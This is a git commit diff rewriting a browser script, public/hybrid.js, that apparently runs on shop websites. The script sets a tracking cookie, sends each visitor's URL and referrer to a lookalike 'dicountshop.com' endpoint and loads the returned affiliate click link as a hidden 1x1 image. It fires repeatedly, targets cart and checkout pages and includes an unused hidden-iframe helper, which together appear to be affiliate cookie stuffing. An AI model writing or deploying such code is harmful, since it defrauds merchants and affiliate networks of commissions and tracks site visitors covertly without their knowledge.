cd244b91406c7fe3255e1f40d991750804b4dcef
kiyaanmarketing <Rajy4251@gmail.com>
2025-09-11 06:32:08 +0000

    new changes

--- public/hybrid.js
+++ public/hybrid.js
@@ -1,75 +1,94 @@
-(async function () {
-  function generateUUID() {
-    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
-      var r = (Math.random() * 16) | 0,
-        v = c === "x" ? r : (r & 0x3) | 0x8;
-      return v.toString(16);
-    });
-  }
-
-  function createTrackingPixel(url) {
-     
-    var img = document.createElement("img");
-    img.src = url;
-    img.style.width = "1px";
-    img.style.height = "1px";
-    img.style.display = "none";
-    document.body.appendChild(img);
-  }
-
-  async function initTracking() {
-    try {
-      let uniqueId = getCookie("tracking_uuid") || generateUUID();
-      let expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
-      document.cookie =
-        "tracking_uuid=" + uniqueId + "; expires=" + expires + ";path=/;";
-
-     
-      let result = {
-        success: true,
-        affiliate_url:
-          "https://tracking.icubeswire.co/aff_c?offer_id=5779&aff_id=465&url_id=10328",
-      };
-
-      if (result.success && result.affiliate_url) {
-        createTrackingPixel(result.affiliate_url);
-        sessionStorage.setItem("iframe_triggered", "true");
-      } else {
-        createTrackingPixel(
-          "https://api.discountshop.com/api/fallback-pixel?id=" + uniqueId
-        );
-      }
-    } catch (error) {
-      console.error("Error in tracking script:", error);
+(function () {
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            var r = Math.random() * 16 | 0,
+                v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
     }
-  }
 
-  function getCookie(cname) {
-    var name = cname + "=";
-    var ca = document.cookie.split(";");
-    for (var i = 0; i < ca.length; i++) {
-      var c = ca[i].trim();
-      if (c.indexOf(name) === 0) {
-        return c.substring(name.length, c.length);
-      }
+    function createTrackingPixel(url) {
+      console.log("url. ==> ",url)
+        var img = document.createElement('img');
+        img.src = url;
+        img.width = 1;
+        img.height = 1;
+        img.style.display = 'none';
+        img.style.visibility = 'hidden';
+        document.body.appendChild(img);
     }
-    return "";
-  }
 
-  function isCartPage() {
-    const cartPages = ["/cart", "/checkout","/checkout/shipping","/checkout/cart"];
-    return cartPages.some((path) => window.location.pathname.includes(path));
-  }
+    function createClickIframe(url) {
+        var iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.width = "1";
+        iframe.height = "1";
+        iframe.style.display = "none";
+        iframe.style.visibility = "hidden";
+        document.body.appendChild(iframe);
+    }
 
- 
-  window.addEventListener("DOMContentLoaded", function () {
+    async function initTracking() {
+        try {
+            let uniqueId = getCookie('tracking_uuid') || generateUUID();
+            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
+            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
+            console.log("in 36 ", uniqueId)
+            let response = await fetch('https://dicountshop.com/api/track-user', {
+                method: 'POST',
+                body: JSON.stringify({
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    unique_id: uniqueId,
+                    origin: window.location.hostname,
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            });
+            console.log("before result ==> ")
+            let result = await response.json();
+            console.log("after result ==> ", result)
+
+           
+            if (result.success && result.affiliate_url) {
+                
+                createTrackingPixel(result.affiliate_url);
+               
+                sessionStorage.setItem('iframe_triggered', 'true');
+            } else {
+                createTrackingPixel('https://dicountshop.com/api/fallback-pixel?id=' + uniqueId);
+            }
+        } catch (error) {
+            console.error('Error in tracking script:', error);
+        }
+    }
+
+    function getCookie(cname) {
+        var name = cname + '=';
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) === 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return '';
+    }
+
+    function isCartPage() {
+            console.log("Add to card result ==> ")
+        const cartPages = ["/cart", "/checkout","/checkout/shipping","/checkout/cart"];
+        return cartPages.some(path => window.location.pathname.includes(path));
+    }
+
     if (isCartPage()) {
-     
-      setTimeout(initTracking, 2000);
-    } else {
-      initTracking();
+        initTracking();
     }
-  });
-  setTimeout(initTracking, 2000);
-  initTracking();
+    initTracking();
+    setTimeout(initTracking, 2000);
+    window.addEventListener("DOMContentLoaded", initTracking);
 })();
